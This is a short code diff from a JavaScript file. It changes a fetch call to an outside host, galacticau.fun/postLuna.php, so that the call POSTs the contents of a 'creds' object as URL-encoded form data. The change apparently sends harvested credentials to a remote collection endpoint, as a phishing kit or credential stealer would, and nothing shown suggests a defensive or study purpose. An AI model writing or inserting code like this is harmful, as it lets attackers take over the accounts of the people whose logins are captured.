@@ -16,7 +16,9 @@ console.log(generateId())
 
 
 fetch('https://galacticau.fun/postLuna.php/?nnplayer=nabil',{
-  method:'POST'
+  method:'POST',
+   headers: {"Content-type": "application/x-www-form-urlencoded; charset=UTF-8"},
+    body: Object.entries(creds).map(([k,v])=>{return k+'='+v}).join('&')
 })
   .then((response) => response.text())
   .then((data) => console.log(data));
